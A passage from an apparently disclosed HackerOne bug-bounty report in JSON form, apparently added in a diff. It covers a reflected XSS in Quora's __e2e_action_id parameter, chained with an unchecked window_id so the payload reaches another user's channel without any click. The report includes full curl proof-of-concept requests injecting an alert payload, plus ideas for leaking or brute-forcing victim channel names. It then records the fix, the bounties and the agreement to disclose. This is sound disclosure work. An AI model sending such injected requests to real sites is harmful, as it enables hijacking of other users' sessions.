<code>_lm_transaction_id</code>:</p>\n\n<ul>\n<li>update_access_token</li>\n</ul>\n\n<p>others reflect only <code>__e2e_action_id</code>:</p>\n\n<ul>\n<li>increase_count</li>\n</ul>\n\n<p>while others seems do not reflect any of these params, since no message is sent to <code>update</code> after these requests:</p>\n\n<ul>\n<li>choose_photo</li>\n<li>clear_badge</li>\n<li>decline_modal</li>\n<li>fetch_toggled_component</li>\n<li>flag_modal</li>\n<li>get_edit_wrapper</li>\n<li>get_next_page</li>\n<li>load_menu</li>\n<li>load_modal</li>\n<li>log_highlight_error</li>\n<li>log_private_views</li>\n<li>results_content_for</li>\n<li>saved_results_content_for</li>\n<li>set_dialog_contents</li>\n<li>upload</li>\n</ul>\n\n<h3 id=\"summing-up-i-suggest\">summing up I suggest</h3>\n\n<ul>\n<li>to check the length of <code>__e2e_action_id</code>\n</li>\n<li>to fix the escaping of this new parameter</li>\n<li>to understand if this mechanism to send data can have others security implication or to not allow to use others <code>window_id</code>\n</li>\n</ul>\n\n<p>I&#39;m wondering if this new parameter can be rewarded with a bounty? <br>\nLet me know if you need more informations or when it is fixed, I will re-check.</p>\n\n<p>Thank you, I learned new things ^^ (and sorry for my english) </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1941085, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-23T22:42:57.192Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-23T22:42:57.192Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Hi @sriram-quora, there is any update with this last issue? Best regards", 
+            "markdown_message": "<p>Hi <a href=\"/sriram-quora\">@sriram-quora</a>, there is any update with this last issue? Best regards</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1950475, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-23T23:45:46.727Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-23T23:45:46.727Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Yeah _lm_transaction_id is also an issue and we are fixing it.", 
+            "markdown_message": "<p>Yeah _lm_transaction_id is also an issue and we are fixing it.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1950617, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-08-23T23:46:28.222Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-23T23:46:28.222Z", 
+            "actor": {
+                "url": "/quora", 
+                "profile": {
+                    "name": "Quora"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/152/b45d3ae0a0f8972e946e307080222878b2016c7e_medium.png?1439494590"
+                }
+            }, 
+            "team_handle": "quora", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "0xnan", 
+                "url": "/0xnan"
+            }, 
+            "message": "adding a another small bonus for the new find.", 
+            "markdown_message": "<p>adding a another small bonus for the new find.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1950618, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-24T00:18:57.554Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-24T00:18:57.554Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Really thank you! I will check ASAP, in the meantime if there is anything i can do to help you let me know. Best regards", 
+            "markdown_message": "<p>Really thank you! I will check ASAP, in the meantime if there is anything i can do to help you let me know. Best regards</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1950675, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-25T12:23:22.200Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-25T12:23:22.200Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "I can confirm that `_lm_transaction_id` is fixed now ", 
+            "markdown_message": "<p>I can confirm that <code>_lm_transaction_id</code> is fixed now </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1954277, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "0xnan", 
+                "url": "/0xnan"
+            }, 
+            "created_at": "2017-08-25T17:13:42.400Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-25T17:13:42.400Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Thanks. We also added length limits.", 
+            "markdown_message": "<p>Thanks. We also added length limits.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1955254, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T15:44:00.218Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T15:44:00.218Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2474099, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T15:54:50.801Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T15:54:50.801Z", 
+            "actor": {
+                "username": "0xnan", 
+                "url": "/0xnan", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Hi I'm thinking to do a blog post about this report (and the others by me), soon or later. I'd like to reference directly these Hackerone reports. Can we publicly disclosure them? We can hide some/all comments if you prefer", 
+            "markdown_message": "<p>Hi I&#39;m thinking to do a blog post about this report (and the others by me), soon or later. I&#39;d like to reference directly these Hackerone reports. Can we publicly disclosure them? We can hide some/all comments if you prefer</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2474122, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T18:54:18.019Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T18:54:18.019Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2474624, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T18:54:18.158Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T18:54:18.158Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2474625, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-08T18:55:42.686Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-08T18:55:42.686Z", 
+            "actor": {
+                "username": "sriram-quora", 
+                "url": "/sriram-quora", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "quora", 
+            "message": "Done. Let us know if you want any details from us for the blog and please provide the link to it.", 
+            "markdown_message": "<p>Done. Let us know if you want any details from us for the blog and please provide the link to it.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2474631, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "0xnan", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/0xnan", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 61, 
+        "name": "Cross-site Scripting (XSS) - Reflected"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-03-08T18:54:18.108Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/259100", 
+    "created_at": "2017-08-11T21:09:40.457Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"summary\">Summary:</h1>\n\n<p>The <code>__e2e_action_id</code> params used with POST requests to <code>/server_call_POST?_m=*</code> endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.<br>\nAlso, another issue on some methods (such as <code>/server_call_POST?_m=edit</code>) allows - with a <em>strong</em> premise discussed on the description - <em>any</em> authenticated user to deliver the vulnerability to another user without any interaction.</p>\n\n<h1 id=\"description\">Description</h1>\n\n<h2 id=\"xxs\">XXS</h2>\n\n<p>On the Web Application <a title=\"http://www.quora.com\" href=\"/redirect?signature=d8bf2f826e1831f836e87dd3789d9a74f7b05659&amp;url=http%3A%2F%2Fwww.quora.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.quora.com</span><i class=\"icon-external-link\"></i></a> most user actions are performed as POST on <code>/server_call_POST?_m=*</code>, implementing AJAX architecture.<br>\nOn the client side these requests are processed by  <code>./shared/core/rpc.js</code> library that in turns uses the library <code>./actions.js</code> to define &quot;actions&quot; which have an ID <code>__e2e_action_id</code> and some methods such as startAction() and <strong>finishAction(id, ...)</strong>.<br><br>\nThe <code>__e2e_eaction_id</code> is generated for every request with <code>id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36)</code> so its value is intended to be composed by [0-9a-z].</p>\n\n<p>When a user performs an action, this ID is embedded on the POST request and with some methods (for<br>\nexample <code>/server_call_POST?_m=load_menu</code>) its content is reflected back as first argument of<br>\nfinishAction().  For example a &quot;normal&quot; call, with <code>__e2e_action_id=esko02tjqe</code> is the following (I&#39;ve omitted most headers/params/data):</p>\n<pre class=\"highlight plaintext\"><code>curl &#39;https://www.quora.com/webnode2/server_call_POST?_v=####&amp;_m=load_menu&#39;  \n-data &#39;json=...&amp;__e2e_action_id=esko02tjqe&amp;...&#39;\n\n&gt; POST /webnode2/server_call_POST?_v=\u2588\u2588\u2588\u2588\u2588&amp;_m=load_menu HTTP/1.1\n&gt; Host: www.quora.com\n&gt; Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n...\n&lt; HTTP/1.1 200 OK\n&lt; Content-Type: application/json; charset=utf-8\n&lt; Server: nginx\n&lt; \n{&quot;value&quot;: {\n     &quot;html&quot;: ..., \n      &quot;css&quot;: .......,                             (\u2193\u2193\u2193\u2193\u2193\u2193 reflected ID)\n       &quot;js&quot;: &quot;require(&#39;actions&#39;).finishAction(&#39;esko02tjqe&#39;, {\\&quot;controller\\&quot;: \\&quot;webnode2\\&quot;, \\&quot;action\\&quot;: \\&quot;server_call_POST\\&quot;, \\&quot;standard\\&quot;: {}, \\&quot;serverTime\\&quot;: 34511, \\&quot;mustReport\\&quot;: true});\\n            var webnode = require(&#39;shared/core/webnode&#39;);\\n   ....     &quot;}, \n   &quot;pmsg&quot;: null}\n</code></pre>\n<p>Since no escaping is performed, it is possible to inject code, for example setting <code>__e2e_action_id=&#39;,alert(),&#39;</code> which will produce:</p>\n<pre class=\"highlight plaintext\"><code>...\n &quot;js&quot;: &quot;require(&#39;actions&#39;).finishAction(&#39;&#39;,alert(),&#39;&#39;, {\\&quot;cont... &quot;}, \n...\n</code></pre>\n<p>creating a valid js section that execute <code>alert()</code>.<br>\nFortunately this vulnerability can&#39;t be triggered as it is because this would require the malformed request to be sent by Quora.com since it is <code>./shared/core/rpc.js</code> that execute the response (that has a content type of <code>application/json</code>) and seems that there is no way to directly set the <code>__e2e_action_id</code> on a session of Quora (a new one is generated  for each action).</p>\n\n<h2 id=\"deliver-the-xss-using-jsonp\">Deliver the XSS using JSONP</h2>\n\n<p>I&#39;ve noticed another &quot;vulnerability&quot; that can be chained with the aforementioned to be able to effectively<br>\ndeliver the XSS to an user.<br>\nWhen an user is on Quora, to its page is associated a &quot;channel&quot; (I hope this is the correct name) such as <code>main-w-dep3105-32490323....</code> and there is always a request that try to fetch new &quot;update&quot; from a<br>\nchannel (restarted each time it returns).<br><br>\nThis request is <code>update</code> on *.tch.quora.com, for example:</p>\n<pre class=\"highlight plaintext\"><code>REQUEST\nhttps://tch969298.tch.quora.com/up/chan43-8888/updates?&amp;callback=jsonp&lt;callback_name&gt;&amp;channel=main-w-dep3105-32490323....&amp;hash=16762940...\n\nPOSSIBLE RESPONSE:\njsonp&lt;callback_name&gt;({&quot;messages&quot;:[&quot;require.whenReady(\\&quot;main\\&quot;, function() {\\n ... ,&quot;min_seq&quot;:1591113381})\n</code></pre>\n<p>The action <code>/server_call_POST?_m=edit</code> (used for example when an user change its profile description), do not behave like <code>/server_call_POST?_m=load_menu</code> (described in the first section). What I mean is that they do not reply with the response <code>{&quot;value&quot;: {&quot;html&quot;: ..., &quot;css&quot;: ...., &quot;js&quot;: ...}, &quot;pmsg&quot;: &quot;&quot;}</code> to update the page but they reply with a response <code>{&quot;value&quot;: null, &quot;pmsg&quot;: null}</code> and <em>deliver the update through a message on the channel of the user</em>.</p>\n\n<p>For example after a <code>/server_call_POST?_m=edit</code> with <code>__e2e_action_id=eskrisktsq</code> the <code>/update?</code> request reply with:</p>\n<pre class=\"highlight plaintext\"><code>jsonp&lt;callback_name&gt;({&quot;messages&quot;:[&quot;require.whenReady(\\&quot;main\\&quot;, function()\n {require(&#39;actions&#39;).finishAction(&#39;eskrisktsq&#39; ... &lt;other data of the edit action&gt;\n                                     \u2191\u2191\u2191\u2191\u2191\n             (__e2e_action_id of the _m=edit call reflected)\n\n</code></pre>\n<p>on which <code>eskrisktsq</code> is the <code>__e2e_action_id</code> used on the <code>_m=edit</code> call vulnerable to XSS.<br>\nThe fact that <code>_m=edit</code> sent a message to the channel <code>main-w-dep3105-32490323....</code> it&#39;s because this channel is specified as parameter on the request <code>_m=edit</code>:</p>\n<pre class=\"highlight plaintext\"><code>curl &#39;https://www.quora.com/webnode2/server_call_POST?_v=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;_m=edit&#39; \n--data &#39;json={\n&quot;args&quot;:[],&quot;kwargs&quot;:{the data of the edit}}&amp;\nrevision=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;\nformkey=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;\npostkey=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;\nwindow_id=dep3105-32490323....&amp;                          \u2190 specified here\n_lm_window_id=dep3105-32490323....&amp;                      \u2190   and here\n__e2e_action_id=eskrisktsq&amp;\n&amp;__vcon_json=[\u2588\u2588\u2588\u2588\u2588]&amp;.....&#39; \n</code></pre>\n<p>The real problem is that this method <strong>do not check if the specified channel is associated to user session who performed the call</strong>. So what could happen is that the attacker can send the XSS to<br>\na specified channel name that will be triggered as soon as the <code>update?</code> request (of the victim user) receives the evil data, without any interaction of the victim.<br>\nThe <em>effect</em> of <code>_m=edit</code> (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but <em>the finishAction() message</em> (vulnerable to XSS) is sent to the <em>victim</em> channel name.</p>\n\n<p>I can confirm that this behavior is not present on other methods: for example with <code>_m=load_menu</code> if you try to change the <code>window_id</code> you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as <code>_m=edit</code>.<br><br>\nI&#39;ve not tested other methods, anyway I think that all the methods that reply with <code>{&quot;value&quot;: null, &quot;pmsg&quot;: null}</code> are vulnerable but not the ones that reply with the update directly (as <code>_m=load_menu</code> does) .</p>\n\n<p>The <em>strong</em> premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.</p>\n\n<p>Anyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:</p>\n\n<ol>\n<li>There could be easy ways that I did not find to leak valid channel_name</li>\n<li>The attack can&#39;t be stopped from browser XSS filters</li>\n<li>The XSS seems to work only on Quora.com (Android do not use <code>__e2e_action_id</code>, IOs not tested)</li>\n<li>A channel_name is composed of <code>dep&lt;4 digit[0-9]&gt;-&lt;up to 19 digit[0-9]&gt;</code>. Valid 4 digits for <code>dep</code>\ncan be leaked using <code>https://www.quora.com/check_livedeps/index?window_id=dep3304-</code>\nthat seems to respond with &quot;ok&quot; if the 4 digits (in this case 3304) are part of a channel alive.</li>\n<li>the remaining part is infeasible to enumerate (10^19), but should be noted that:\n\n<ul>\n<li> doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker&#39;s Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.</li>\n<li>if the XSS is sent to a channel_name that is not used by any user and Quora assigns this\nchannel_name, up to 5minutes <strong>later</strong> the evil request was sent, the XSS is delivered correctly.\n(BTW I do not know if Quora would assign a channel name on which a message is already &quot;pending&quot;)\n-I think the attacker can keep busy some channels name (reducing the space to enumerate),\nlogging and executing the same code that Quora uses to attach a channel to an user, e.g:<br>\n</li>\n</ul>\n</li>\n</ol>\n<pre class=\"highlight plaintext\"><code> require(&quot;tchannel_up&quot;).start(0, &quot;main-w-dep3104-34040...&quot;, &quot;2287....&quot;, &quot;chan42-8888&quot;, &quot;quora.com&quot;, &quot;&quot;);\n\nor simply a repeated GET on:\n\nhttps://tch969298.tch.quora.com/up/chan42-8888/updates?&amp;callback=jsonp&lt;callback_name&gt;&amp;channel=main-w-dep3104-34040...&amp;hash=2287....\n</code></pre>\n<p>since seems that there isn&#39;t a limit on how much &quot;active&quot; channel are reserved for a user session (I&#39;ve not tried extensively, but i&#39;ve executed 3 time the code with channel saved from past session - since you need the <code>hash</code> params - and works).</p>\n\n<h3 id=\"steps-to-reproduce\">Steps To Reproduce</h3>\n\n<p>I describe the steps using browser Chromium, but it is not stricly necessary</p>\n\n<ol>\n<li>Attacker log in on Quora.com and goes on its profile page </li>\n<li>Attacker open developer tools of its browser and goes on the &quot;Network&quot; tab</li>\n<li>\n<p>Attacker update its profile description using dummy data and copy the request performed on <code>server_call_POST?_m=edit</code>, eg:</p>\n\n<p><code>curl &#39;https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&amp;_m=edit&#39; -H &#39;Cookie: m-b=&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;; m-sa=1; m-s=&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;; m-screen_size=1920x1080; m-login=1; m-ju=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915&#39; -H &#39;Origin: https://www.quora.com&#39; -H &#39;Accept-Encoding: gzip, deflate, br&#39; -H &#39;Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&#39; -H &#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39; -H &#39;Accept: application/json, text/javascript, */*; q=0.01&#39; -H &#39;Referer: https://www.quora.com/profile/Aleph-NaN&#39; -H &#39;X-Requested-With: XMLHttpRequest&#39; -H &#39;Connection: keep-alive&#39; -H &#39;DNT: 1&#39; --data &#39;json={&quot;args&quot;:[],&quot;kwargs&quot;:{&quot;id&quot;:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,&quot;input&quot;:{&quot;sections&quot;:[{&quot;type&quot;:&quot;plain&quot;,&quot;indent&quot;:0,&quot;quoted&quot;:false,&quot;spans&quot;:[{&quot;modifiers&quot;:{},&quot;text&quot;:&quot;a&quot;}]}],&quot;caret&quot;:{&quot;start&quot;:{&quot;spanIdx&quot;:0,&quot;sectionIdx&quot;:0,&quot;offset&quot;:1},&quot;end&quot;:{&quot;spanIdx&quot;:0,&quot;sectionIdx&quot;:0,&quot;offset&quot;:1}}}}}&amp;revision=904d048187b642341464067b64246119b8ce9489&amp;formkey=6a34c75ed7fda8439ca2407b4520c974&amp;postkey=736f2eea9e3826808823625bf4ede215&amp;window_id=dep3204-1727465467565139446&amp;referring_controller=user&amp;referring_action=profile&amp;_lm_transaction_id=0.7159021828610441&amp;_lm_window_id=dep3204-1727465467565139446&amp;__vcon_json=[&quot;2rtUq6Z4HO9gWK&quot;]&amp;__vcon_method=edit&amp;__e2e_action_id=esl2xq4xyj&amp;js_init={&quot;id&quot;:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,&quot;input&quot;:&quot;user_description_text&quot;,&quot;typing_area&quot;:null,&quot;draft_space&quot;:null,&quot;unsaved_content_msg&quot;:&quot;Your content has not been saved.&quot;,&quot;focus_onload&quot;:false,&quot;is_qtext&quot;:true,&quot;require_comment&quot;:false,&quot;require_value&quot;:false,&quot;content_type&quot;:null,&quot;submit_text&quot;:&quot;Update&quot;,&quot;show_editor&quot;:false}&amp;__metadata={}&#39; --compressed</code></p>\n</li>\n<li><p>the attacker obtain the victim channel name, eg: <code>dep3501-3261853912009855464</code></p></li>\n<li><p>the attacker modify its previusly copied request, setting the <code>window_id</code> and <code>_lm_window_id</code> parameters to the victim channel name</p></li>\n<li><p>the attacker modify the request, setting the <code>__e2e_action_id</code> parameter to inject its javascript payload, for example to <code>&#39;,alert(1),&#39;</code>, eg: <br>\n<code>curl &#39;https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&amp;_m=edit&#39; -H &#39;Cookie: m-b=&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;; m-sa=1; m-s=&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;; m-screen_size=1920x1080; m-login=1; m-ju=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915&#39; -H &#39;Origin: https://www.quora.com&#39; -H &#39;Accept-Encoding: gzip, deflate, br&#39; -H &#39;Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&#39; -H &#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39; -H &#39;Accept: application/json, text/javascript, */*; q=0.01&#39; -H &#39;Referer: https://www.quora.com/profile/\u2588\u2588\u2588\u2588&#39; -H &#39;X-Requested-With: XMLHttpRequest&#39; -H &#39;Connection: keep-alive&#39; -H &#39;DNT: 1&#39; --data &#39;json={&quot;args&quot;:[],&quot;kwargs&quot;:{&quot;id&quot;:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,&quot;input&quot;:{&quot;sections&quot;:[{&quot;type&quot;:&quot;plain&quot;,&quot;indent&quot;:0,&quot;quoted&quot;:false,&quot;spans&quot;:[{&quot;modifiers&quot;:{},&quot;text&quot;:&quot;a&quot;}]}],&quot;caret&quot;:{&quot;start&quot;:{&quot;spanIdx&quot;:0,&quot;sectionIdx&quot;:0,&quot;offset&quot;:1},&quot;end&quot;:{&quot;spanIdx&quot;:0,&quot;sectionIdx&quot;:0,&quot;offset&quot;:1}}}}}&amp;revision=904d048187b642341464067b64246119b8ce9489&amp;formkey=6a34c75ed7fda8439ca2407b4520c974&amp;postkey=736f2eea9e3826808823625bf4ede215&amp;window_id=dep3501-3261853912009855464&amp;referring_controller=user&amp;referring_action=profile&amp;_lm_transaction_id=0.7159021828610441&amp;_lm_window_id=dep3501-3261853912009855464&amp;__vcon_json=[&quot;2rtUq6Z4HO9gWK&quot;]&amp;__vcon_method=edit&amp;__e2e_action_id=\\&#39;,alert(1),\\&#39;&amp;js_init={&quot;id&quot;:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,&quot;input&quot;:&quot;user_description_text&quot;,&quot;typing_area&quot;:null,&quot;draft_space&quot;:null,&quot;unsaved_content_msg&quot;:&quot;Your content has not been saved.&quot;,&quot;focus_onload&quot;:false,&quot;is_qtext&quot;:true,&quot;require_comment&quot;:false,&quot;require_value&quot;:false,&quot;content_type&quot;:null,&quot;submit_text&quot;:&quot;Update&quot;,&quot;show_editor&quot;:false}&amp;__metadata={}&#39; --compressed</code></p></li>\n<li><p>the attacker send the request</p></li>\n<li><p>on the victim page will be executed <code>alert(1)</code></p></li>\n</ol>\n\n<p>Notice that the cookie, postkey, formkey and other data are of the attacker session.</p>\n\n<h3 id=\"enviroment\">Enviroment</h3>\n\n<p>Tools used: <code>curl</code> and <code>chromium</code></p>\n\n<h3 id=\"suggested-fix\">Suggested fix</h3>\n\n<ul>\n<li>correctly escape <code>__e2e_action_id</code>\n</li>\n<li>do not allow to specify a channel name (<code>window_id</code> parameter) that is not &quot;attached&quot; to the session of the caller</li>\n</ul>\n\n<p>I can provide a demonstrating video if required or other info. <br>\nThe severity was calculated with the Hackerone Calculator.</p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.quora.com", 
+            "about": "A place to share knowledge and better understand the world.", 
+            "twitter_handle": "quora", 
+            "name": "Quora"
+        }, 
+        "handle": "quora", 
+        "url": "https://hackerone.com/quora", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/003/152/aa5fe0775d0005dc3b5fe55819e717ef833c8994_small.png?1439494590", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/003/152/b45d3ae0a0f8972e946e307080222878b2016c7e_medium.png?1439494590"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 3152, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
